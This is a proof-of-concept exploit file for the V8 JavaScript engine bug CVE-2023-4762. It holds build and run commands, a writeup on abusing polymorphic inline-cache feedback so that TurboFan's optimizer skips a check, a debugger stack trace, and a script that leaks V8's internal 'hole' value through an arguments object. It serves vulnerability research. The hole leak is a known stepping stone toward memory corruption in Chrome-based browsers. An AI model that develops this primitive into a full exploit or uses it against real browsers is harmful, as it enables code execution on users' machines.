// CVE-2023-4762 poc
// author: @buptsb
//
// checkout github.com/mistymntncop/CVE-2023-3079 for more details,
// thanks @mistymntncop for the polymorphic IC skills!

/*
0. Patch
https://chromium-review.googlesource.com/c/v8/v8/+/4817946

1. Build
```
git checkout fcac1bdaf2ad5995647b4e7a173df2674aea07d8
gclient sync
ninja -j16 d8
```

2. Run
```
./d8 --allow-natives-syntax --trace-turbo --trace-deopt --log-ic ./poc.js
```
*/

/*
Writeup:

Checkout the comments in patch file `compiler/js-native-context-specialization.cc`:
      // Non-JSArray PACKED_*_ELEMENTS always grow by adding holes because they
      // lack the magical length property, which requires a map transition.
      // So we can assume that this did not happen if we did not see this map.

Seems like its another HOLE leak bug similar to github.com/mistymntncop/CVE-2023-3079.

For ReduceElementAccess in NativeContextSpecialization(inlining phase in Tubofan Pipeline)
to trigger, we need:

0. Non-JSArray PACKED_*_ELEMENTS
  Only JSArguments satisfy this.
1. store_mode == STORE_AND_GROW_HANDLE_COW
  The if check: `IsGrowStoreMode(keyed_mode.store_mode()))` in //v8/src/compiler/js-native-context-specialization.cc:3456

Since CVE-2023-3079 fixed the non-standard store_mode for JSArguments in feedback,
we have to find out how to setup it during Turbofan optimizer runs.

## Guess 0: 
As StoreElementHandler() in ic.cc has forced store_mode to be STANDARD_STORE, 
maybe we could use map transition + polymorphic ic skills in CVE-2023-3079 to set store_mode to STORE_AND_GROW_HANDLE_COW.

Since JSArguments has default elements kind PACKED_ELEMENTS, which could only transition to HOLEY_ELEMENTS on v8 map lattice,
which does not satisfy rule 0.

And you can't construct a JSArgument object with elements kind like PACKED_SMI_ELEMENTS.

## Guess 1:
SloppyFastArgumentsObject?

Turns out only fast elements kind can be inlined by Turbofan, check MapRef::CanInlineElementAccess().

## StoreMode in TurboFan
Turbofan fetch store mode from feedback nexus in FeedbackNexus::GetKeyedAccessStoreMode(),
checkout the stack trace:

#0  v8::internal::FeedbackNexus::GetKeyedAccessStoreMode (this=0x7ffd905a1be8)
    at ../../src/objects/feedback-vector.cc:1234
#1  0x00007f3b14061384 in v8::internal::compiler::KeyedAccessMode::FromNexus (nexus=...)
    at ../../src/compiler/js-heap-broker.cc:345
#2  0x00007f3b140627fc in v8::internal::compiler::JSHeapBroker::ReadFeedbackForPropertyAccess (this=0x5584aeb0cb90, 
    source=..., mode=v8::internal::compiler::AccessMode::kStore, static_name=...)
    at ../../src/compiler/js-heap-broker.cc:535
#3  0x00007f3b14064d15 in v8::internal::compiler::JSHeapBroker::GetFeedbackForPropertyAccess (this=0x5584aeb0cb90, 
    source=..., mode=v8::internal::compiler::AccessMode::kStore, static_name=...)
    at ../../src/compiler/js-heap-broker.cc:775
#4  0x00007f3b1409e599 in v8::internal::compiler::JSNativeContextSpecialization::ReducePropertyAccess (
    this=0x7ffd905a2818, node=0x5584aeb252c8, key=0x5584aeb24030, static_name=..., value=0x5584aeb24070, source=..., 
    access_mode=v8::internal::compiler::AccessMode::kStore)
    at ../../src/compiler/js-native-context-specialization.cc:2482
#5  0x00007f3b14094771 in v8::internal::compiler::JSNativeContextSpecialization::ReduceJSSetKeyedProperty (
    this=0x7ffd905a2818, node=0x5584aeb252c8) at ../../src/compiler/js-native-context-specialization.cc:2657
#6  0x00007f3b1408efa2 in v8::internal::compiler::JSNativeContextSpecialization::Reduce (this=0x7ffd905a2818, 
    node=0x5584aeb252c8) at ../../src/compiler/js-native-context-specialization.cc:116

Which iterates all the `maps_and_handlers`, return the first handler's keyed access store_mode.
So we may construct a polymophic feedback map_handlers series, in which the first handler's store_mode is STORE_AND_GROW_HANDLE_COW.

In CVE-2023-3079, the feedback series is:
step 0. arguments["foo"] = 1, mono handler
step 1. arr[0] = 1, poly handlers:
	- index 0: map: JSArguments.map, store_mode: STANDARD
	- index 1: map: arr.map, store_mode: STORE_AND_GROW_HANDLE_COW

Now:
step 0. objectA["foo"] = 1, mono handler
step 1. arguments["foo"] = 1, poly handlers
step 2. arr[0] = 1, poly handlers:
	- index 0: map: objectA.map, store_mode: STORE_AND_GROW_HANDLE_COW
	- index 1: map: JSArguments.map, store_mode: STANDARD
	- index 2: map: arr.map, store_mode: STORE_AND_GROW_HANDLE_COW

*/

function keyed_store(obj, key, value) {
  obj[key] = value;
}

class A {}
let a = new A();

let genArgs = function() { return arguments };

%EnsureFeedbackVectorForFunction(keyed_store);
keyed_store(a, "foo", 1);
// %DebugPrint(keyed_store);
keyed_store(genArgs(), "foo", 1);
// %DebugPrint(keyed_store);
keyed_store([], 0, 1);
// %DebugPrint(keyed_store);

%PrepareFunctionForOptimization(keyed_store);
%OptimizeFunctionOnNextCall(keyed_store);

let args = genArgs();
keyed_store(args, 0, 1);

let hole = args[args.length+1];
%DebugPrint(%StrictEqual(hole, %TheHole()));
